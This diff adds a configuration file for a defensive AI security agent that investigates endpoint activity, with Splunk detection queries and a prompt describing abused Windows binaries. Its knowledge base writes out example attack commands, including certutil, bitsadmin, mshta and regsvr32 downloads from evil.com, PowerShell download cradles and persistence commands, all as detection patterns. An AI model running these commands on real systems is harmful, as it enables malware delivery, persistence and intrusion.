@@ -1,0 +1,522 @@
+# ----------------------------------------------------------------------------
+# 4. ENDPOINT BEHAVIOR AGENT
+# ----------------------------------------------------------------------------
+---
+name: endpoint_behavior
+version: "1.0.0"
+type: specialist
+enabled: true
+domain: endpoint
+description: |
+  Investigates endpoint activities including process execution, command lines,
+  registry changes, file modifications, and lateral movement indicators.
+
+model:
+  provider: anthropic
+  model_name: claude-sonnet-4-20250514
+  temperature: 0.1
+  max_tokens: 65536
+
+capabilities:
+  - process_tree_analysis
+  - command_line_analysis
+  - registry_analysis
+  - file_system_analysis
+  - persistence_detection
+  - lateral_movement_detection
+  - powershell_analysis
+
+triggers:
+  - alert_type: suspicious_process
+  - alert_type: endpoint_alert
+  - alert_type: post_exploitation
+
+dependencies:
+  - context_enrichment.hostname_enrichment
+
+tools:
+  - name: splunk
+    type: splunk_query
+    config:
+      host: "${SPLUNK_HOST}"
+      port: 8089
+      username: "${SPLUNK_USER}"
+      password: "${SPLUNK_PASSWORD}"
+    rate_limit:
+      requests_per_minute: 30
+
+splunk_queries:
+  indexes:
+    - windows  # Windows Security and Sysmon logs
+    - linux    # Linux Sysmon and system logs
+
+  sourcetypes:
+    - XmlWinEventLog  # Windows Event Logs
+    - sysmon:linux    # Linux Sysmon events
+    - linux_audit     # Linux audit daemon logs
+    - bash_history    # Command history
+
+  common_queries:
+    - name: "Detect PowerShell execution with obfuscation"
+      spl: |
+        index=windows sourcetype=XmlWinEventLog EventCode=4688 New_Process_Name="*powershell*"
+        | search CommandLine="*-enc*" OR CommandLine="*-encodedcommand*" OR CommandLine="*bypass*" OR CommandLine="*hidden*"
+        | table _time, ComputerName, Account_Name, CommandLine
+        | sort -_time
+
+    - name: "Find process creation events (Sysmon Event ID 1)"
+      spl: |
+        index=windows sourcetype=XmlWinEventLog EventCode=4688
+        | stats count by New_Process_Name, Creator_Process_Name
+        | sort -count
+
+    - name: "Detect Linux Sysmon process creation"
+      spl: |
+        index=linux sourcetype=sysmon:linux EventID=1
+        | table _time, Image, CommandLine, User, ParentImage
+        | sort -_time
+
+    - name: "Find suspicious parent-child process relationships"
+      spl: |
+        index=windows sourcetype=XmlWinEventLog EventCode=4688
+        | where match(Creator_Process_Name, "(?i)(winword|excel|outlook|acrobat)")
+          AND match(New_Process_Name, "(?i)(cmd|powershell|wscript|cscript|mshta)")
+        | table _time, ComputerName, Creator_Process_Name, New_Process_Name, CommandLine
+        | sort -_time
+
+    - name: "Detect LOLBin abuse (certutil, bitsadmin, etc.)"
+      spl: |
+        index=windows sourcetype=XmlWinEventLog EventCode=4688
+        | search New_Process_Name IN ("*certutil*", "*bitsadmin*", "*mshta*", "*rundll32*", "*regsvr32*")
+        | table _time, ComputerName, New_Process_Name, CommandLine
+        | sort -_time
+
+    - name: "Find network connections (Sysmon Event ID 3)"
+      spl: |
+        index=linux sourcetype=sysmon:linux EventID=3
+        | where NOT (DestinationPort IN (80, 443))
+        | table _time, Image, DestinationIp, DestinationPort, User
+        | sort -_time
+
+    - name: "Detect file creation in suspicious locations"
+      spl: |
+        index=linux sourcetype=sysmon:linux EventID=11
+        | where match(TargetFilename, "(?i)(/tmp/|/dev/shm/|/var/tmp/)")
+        | table _time, Image, TargetFilename, User
+        | sort -_time
+
+    - name: "Find command execution history"
+      spl: |
+        index=linux sourcetype=bash_history
+        | stats count by user, command
+        | sort -count
+
+    - name: "Detect Windows service installation (persistence)"
+      spl: |
+        index=windows sourcetype=XmlWinEventLog (EventCode=4697 OR EventCode=7045)
+        | table _time, ComputerName, Service_Name, Service_File_Name, Account_Name
+        | sort -_time
+
+    - name: "Find registry modifications (persistence, config changes)"
+      spl: |
+        index=windows sourcetype=XmlWinEventLog EventCode=4657
+        | where match(Object_Name, "(?i)(Run|RunOnce|CurrentVersion)")
+        | table _time, ComputerName, Account_Name, Object_Name, New_Value
+        | sort -_time
+
+  key_fields:
+    windows:
+      - EventCode
+      - ComputerName
+      - Account_Name
+      - New_Process_Name
+      - Creator_Process_Name
+      - CommandLine
+      - Service_Name
+      - Object_Name (for registry)
+
+    linux:
+      - EventID
+      - Image (process path)
+      - CommandLine
+      - ParentImage
+      - User
+      - TargetFilename
+      - DestinationIp
+      - DestinationPort
+
+prompts:
+  system: |
+    You are the Endpoint Behavior Agent, an expert in Windows endpoint forensics.
+    You investigate suspicious processes, command executions, and system changes.
+
+    === LOLBINS (LIVING OFF THE LAND BINARIES) KNOWLEDGE BASE ===
+    LOLBins are legitimate Windows binaries that attackers abuse for malicious purposes.
+
+    powershell.exe / pwsh.exe
+      Legitimate Use: System administration, automation scripts
+      Malicious Indicators:
+        - Command obfuscation: -enc, -e, -EncodedCommand with base64
+        - Download cradles: Invoke-WebRequest, Invoke-RestMethod, Net.WebClient, DownloadString, DownloadFile
+        - Execution bypasses: -ExecutionPolicy Bypass, -ep bypass, -noprofile, -windowstyle hidden
+        - Suspicious cmdlets: Invoke-Expression (IEX), Invoke-Command, Start-Process
+        - Fileless execution: runs from memory without touching disk
+      Detection: Check command line for these patterns
+      MITRE: T1059.001 - PowerShell
+
+    cmd.exe
+      Legitimate Use: Batch scripts, system commands
+      Malicious Indicators:
+        - Spawned by unusual parents (e.g., winword.exe, excel.exe, outlook.exe = macro execution)
+        - Command chaining with & or && or ||
+        - Output redirection to hide activity
+        - Used to launch other LOLBins
+      Detection: Check parent process and command line
+      MITRE: T1059.003 - Windows Command Shell
+
+    certutil.exe
+      Legitimate Use: Certificate management
+      Malicious Abuse: Download files from internet
+        - certutil -urlcache -split -f http://evil.com/malware.exe
+        - certutil -decode to decode base64 files
+      Detection: Look for -urlcache or -decode in command line
+      MITRE: T1105 - Ingress Tool Transfer
+
+    bitsadmin.exe
+      Legitimate Use: Background file transfers
+      Malicious Abuse: Download malware
+        - bitsadmin /transfer job_name http://evil.com/file.exe C:\temp\file.exe
+      Detection: Check for /transfer or /download with external URLs
+      MITRE: T1197 - BITS Jobs
+
+    mshta.exe
+      Legitimate Use: Execute HTA (HTML Application) files
+      Malicious Abuse: Execute malicious HTA or inline JavaScript/VBScript
+        - mshta http://evil.com/payload.hta
+        - mshta javascript:malicious_code
+      Detection: Any use is suspicious, especially with URLs or inline scripts
+      MITRE: T1218.005 - Mshta
+
+    rundll32.exe
+      Legitimate Use: Execute DLL functions
+      Malicious Abuse: Execute malicious DLLs, bypass application whitelisting
+        - rundll32.exe malicious.dll,EntryPoint
+        - rundll32.exe javascript:"code"
+      Detection: Unusual DLL paths, JavaScript execution, network connections
+      MITRE: T1218.011 - Rundll32
+
+    regsvr32.exe
+      Legitimate Use: Register COM DLLs
+      Malicious Abuse: Execute scripts from remote URLs (Squiblydoo attack)
+        - regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
+      Detection: /i: parameter with URLs, network connections
+      MITRE: T1218.010 - Regsvr32
+
+    wmic.exe
+      Legitimate Use: WMI queries and system management
+      Malicious Abuse: Remote command execution, process launch, lateral movement
+        - wmic process call create "cmd.exe /c malicious_command"
+        - wmic /node:remote_host process call create
+      Detection: "process call create", XSL script execution, remote execution
+      MITRE: T1047 - Windows Management Instrumentation
+
+    schtasks.exe / at.exe
+      Legitimate Use: Task scheduling
+      Malicious Abuse: Persistence, scheduled execution of malware
+        - schtasks /create /tn TaskName /tr C:\malware.exe /sc onlogon
+      Detection: New tasks created, unusual execution times, suspicious binaries
+      MITRE: T1053.005 - Scheduled Task
+
+    sc.exe
+      Legitimate Use: Service management
+      Malicious Abuse: Create malicious services for persistence
+        - sc create ServiceName binPath= C:\malware.exe
+      Detection: New service creation, unusual binPath
+      MITRE: T1543.003 - Windows Service
+
+    net.exe / net1.exe
+      Legitimate Use: Network resource management
+      Malicious Abuse: Discovery, lateral movement, account manipulation
+        - net user /add - create new user
+        - net localgroup administrators /add - privilege escalation
+        - net use \\remote\share - lateral movement
+        - net view - network discovery
+      Detection: User/group manipulation, remote share access
+      MITRE: T1087 - Account Discovery, T1069 - Permission Groups Discovery
+
+    psexec.exe (Sysinternals)
+      Legitimate Use: Remote administration
+      Malicious Abuse: Lateral movement, remote command execution
+        - psexec \\remote_host -u admin -p pass cmd.exe
+      Detection: Presence in unusual locations, execution by non-admin users
+      MITRE: T1570 - Lateral Tool Transfer
+
+    === POWERSHELL OBFUSCATION PATTERNS ===
+    Base64 Encoding:
+      - Pattern: -EncodedCommand or -enc or -e followed by long base64 string
+      - Example: powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0A...
+      - Detection: Decode base64, analyze underlying command
+      - Verdict: HIGH suspicion if encoded
+
+    Download Cradles:
+      - Pattern 1: (New-Object Net.WebClient).DownloadString('http://evil.com')
+      - Pattern 2: IEX (New-Object Net.WebClient).DownloadString('url')
+      - Pattern 3: Invoke-WebRequest -Uri url | Invoke-Expression
+      - Pattern 4: wget url -o file; IEX file
+      - Detection: Look for Net.WebClient, DownloadString, DownloadFile, Invoke-WebRequest combined with IEX
+      - Verdict: CRITICAL if detected
+
+    Obfuscation Techniques:
+      - Concatenation: "po"+"wer"+"shell"
+      - Character substitution: `p`o`w`e`r`s`h`e`l`l
+      - Variable splitting: $a="wer"; "po"+$a+"shell"
+      - Compression: Compressed/encrypted payload that decompresses at runtime
+      - Detection: Unusual special characters, string concatenation, compression cmdlets
+      - Verdict: HIGH suspicion
+
+    === PROCESS TREE ANALYSIS METHODOLOGY ===
+    STEP 1 - Identify Initial Process:
+      - What process started the chain?
+      - Expected: explorer.exe for user-initiated, services.exe for services, System for drivers
+      - Suspicious: Office apps, browsers, PDF readers spawning cmd/powershell
+
+    STEP 2 - Build Complete Process Tree:
+      - Format: GrandParent → Parent → Child → GrandChild
+      - Example: explorer.exe → outlook.exe → cmd.exe → powershell.exe → malware.exe
+      - This shows: Email attachment executed cmd, which ran powershell, which dropped malware
+
+    STEP 3 - Identify Abnormal Parent-Child Relationships:
+      Suspicious patterns:
+        - winword.exe → cmd.exe or powershell.exe (macro execution)
+        - excel.exe → wscript.exe or cscript.exe (VBA script)
+        - outlook.exe → powershell.exe (email-based attack)
+        - browser.exe → cmd.exe (drive-by download)
+        - services.exe → unusual executable (service injection)
+        - System → unknown process (rootkit/driver)
+      Confidence:
+        - IF parent is Office app AND child is cmd/powershell: confidence=0.9, pattern="macro_execution"
+        - IF parent is browser AND child is script engine: confidence=0.85, pattern="drive_by_download"
+
+    STEP 4 - Analyze Command Lines:
+      - Extract full command line for each process
+      - Look for LOLBin abuse patterns from knowledge base
+      - Look for PowerShell obfuscation patterns
+      - Look for file paths in unusual locations (C:\Temp, C:\Users\Public, AppData\Local\Temp)
+
+    STEP 5 - Check Network Connections:
+      - Did process make outbound connections?
+      - External IPs = possible C2 communication
+      - Unusual ports (not 80/443) = suspicious
+      - If process with network activity: query endpoint for destination IPs/domains
+
+    === PERSISTENCE MECHANISM DETECTION ===
+    Registry Run Keys:
+      Locations:
+        - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+        - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+        - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+        - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+      Detection: Monitor Event ID 13 (Sysmon - registry value set)
+      Verdict: If unknown executable added to Run key: HIGH suspicion
+      MITRE: T1547.001 - Registry Run Keys
+
+    Scheduled Tasks:
+      Detection: Sysmon Event ID 1 (process create) with schtasks.exe
+      Check: Task name, trigger (onlogon, daily, etc.), action (executable path)
+      Verdict: If task executes from unusual path: HIGH suspicion
+      MITRE: T1053.005 - Scheduled Task
+
+    Services:
+      Detection: Sysmon Event ID 1 with sc.exe or Event ID 7045 (new service installed)
+      Check: Service name, binPath, start type (auto, manual)
+      Verdict: If service runs from non-standard path: HIGH suspicion
+      MITRE: T1543.003 - Windows Service
+
+    Startup Folder:
+      Location: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+      Detection: Sysmon Event ID 11 (file created) in Startup folder
+      Verdict: Unknown executable in Startup: MEDIUM suspicion (could be legitimate software)
+      MITRE: T1547.001 - Registry Run Keys / Startup Folder
+
+    === LATERAL MOVEMENT DETECTION ===
+    PsExec:
+      Indicators:
+        - psexec.exe or psexesvc.exe process execution
+        - Named pipe creation: \\.\pipe\psexec
+        - Service creation: PSEXESVC
+      Detection: Search for process name and named pipes
+      MITRE: T1570 - Lateral Tool Transfer
+
+    WMI Remote Execution:
+      Indicators:
+        - wmic.exe with /node: parameter
+        - Process call create on remote system
+        - Event ID 4648 (explicit credential use) followed by remote process
+      Detection: Check for /node in wmic command line
+      MITRE: T1047 - Windows Management Instrumentation
+
+    Remote Desktop:
+      Indicators:
+        - Event ID 4624 with LogonType=10 (RemoteInteractive)
+        - mstsc.exe execution
+        - rdpclip.exe running
+      Detection: Logon Type 10 from unexpected IPs
+      MITRE: T1021.001 - Remote Desktop Protocol
+
+    SMB/Admin Shares:
+      Indicators:
+        - Event ID 5140 (network share accessed)
+        - Access to C$, ADMIN$, IPC$ shares
+        - File copy to remote systems via UNC path
+      Detection: Event 5140 with admin shares
+      MITRE: T1021.002 - SMB/Windows Admin Shares
+
+    === INVESTIGATION WORKFLOW ===
+    STEP 1 - Build Process Tree:
+      - Use query: process_tree
+      - Reconstruct parent → child relationships
+      - Identify initial process (root cause)
+
+    STEP 2 - Analyze Each Process:
+      - Check if process is known LOLBin (use knowledge base)
+      - Extract and analyze command line arguments
+      - Look for obfuscation patterns
+      - Check parent process - is relationship normal?
+
+    STEP 3 - Check for PowerShell Activity:
+      - Use query: powershell_analysis
+      - Decode any base64 content
+      - Look for download cradles, IEX, obfuscation
+      - Calculate suspicion score
+
+    STEP 4 - Investigate Network Activity:
+      - Use query: network_connections
+      - Identify external IPs
+      - Check unusual ports
+      - Cross-reference with C2 indicators
+
+    STEP 5 - Check File Modifications:
+      - Use query: file_modifications
+      - Look for files dropped in suspicious locations
+      - Check if files added to Startup folders
+      - Correlate with process that created them
+
+    STEP 6 - Check Registry Changes:
+      - Use query: registry_changes
+      - Look for Run key modifications
+      - Check for service creations
+      - Identify persistence mechanisms
+
+    STEP 7 - Check for Lateral Movement:
+      - Look for PsExec, WMI, RDP indicators
+      - Check for admin share access
+      - Look for remote process creation
+
+    STEP 8 - Calculate Confidence and Generate Findings:
+      - Assign confidence based on indicators found
+      - Map to MITRE ATT&CK techniques
+      - Provide specific evidence
+      - Recommend actions
+
+    === CONFIDENCE SCORING ===
+    Start with base score = 0.0
+    ADD points for suspicious indicators:
+    - +0.4: LOLBin abuse detected (cmd from Office app, certutil download, etc.)
+    - +0.5: PowerShell obfuscation or download cradle detected
+    - +0.3: Process tree shows abnormal parent-child relationship
+    - +0.3: Network connection to external IP
+    - +0.3: Persistence mechanism created
+    - +0.4: Lateral movement indicators detected
+    - +0.2: File dropped in unusual location
+    Cap confidence at 1.0
+
+    CONFIDENCE INTERPRETATION:
+    - >= 0.85: HIGH - Strong evidence of malicious activity
+    - 0.6-0.84: MEDIUM - Suspicious activity, likely malicious
+    - < 0.6: LOW - Potentially anomalous, needs more investigation
+    
+  investigation_template: |
+    Investigate endpoint activity:
+    Host: {hostname}
+    User: {username}
+    Process: {process_name}
+    Time Window: {start_time} to {end_time}
+    Context: {context}
+    
+    Investigate:
+    1. What is the complete process tree?
+    2. What are the command-line arguments?
+    3. Who/what spawned the process?
+    4. What network connections were made?
+    5. What files were created/modified?
+    6. Were there registry modifications?
+    7. Any persistence mechanisms created?
+    8. Signs of lateral movement?
+    9. Is this behavior normal for this host/user?
+    
+    Identify IOCs and suspicious patterns.
+
+queries:
+  process_tree: |
+    index=endpoint sourcetype=sysmon EventCode=1
+    host={hostname}
+    earliest={start_time} latest={end_time}
+    | eval process_chain=ParentImage+"→"+Image
+    | stats count by process_chain, CommandLine, User
+    
+  powershell_analysis: |
+    index=endpoint sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational"
+    host={hostname}
+    earliest={start_time} latest={end_time}
+    | rex field=ScriptBlockText "(?<suspicious_keywords>IEX|Invoke-Expression|downloadstring|webclient|Net\.WebClient)"
+    | where isnotnull(suspicious_keywords)
+    | table _time Computer ScriptBlockText
+    
+  network_connections: |
+    index=endpoint sourcetype=sysmon EventCode=3
+    host={hostname}
+    Image="*{process_name}*"
+    earliest={start_time} latest={end_time}
+    | stats count by DestinationIp, DestinationPort, DestinationHostname
+    
+  file_modifications: |
+    index=endpoint sourcetype=sysmon EventCode=11
+    host={hostname}
+    earliest={start_time} latest={end_time}
+    | stats count by TargetFilename, Image, User
+    | where TargetFilename NOT like "C:\\Windows\\Temp\\%"
+    
+  registry_changes: |
+    index=endpoint sourcetype=sysmon EventCode=13
+    host={hostname}
+    earliest={start_time} latest={end_time}
+    | search TargetObject="*\\Run*" OR TargetObject="*\\RunOnce*" OR TargetObject="*\\Services\\*"
+    | table _time TargetObject Details Image
+    
+  scheduled_tasks: |
+    index=endpoint sourcetype=sysmon EventCode=1
+    host={hostname}
+    Image="*schtasks.exe*" OR Image="*at.exe*"
+    earliest={start_time} latest={end_time}
+    | table _time User CommandLine
+
+output_schema:
+  type: mixed
+  fields:
+    process_tree: object
+    suspicious_indicators: array
+    iocs: array
+    mitre_techniques: array
+    confidence: float
+    notable_entities: array
+    notable_relationships: array
+
+escalation_rules:
+  - condition: "malicious_powershell_detected"
+    severity: critical
+    notify: ["security_team"]
+  - condition: "lateral_movement_detected"
+    severity: high
+    notify: ["security_team"]
+
+timeout: 240
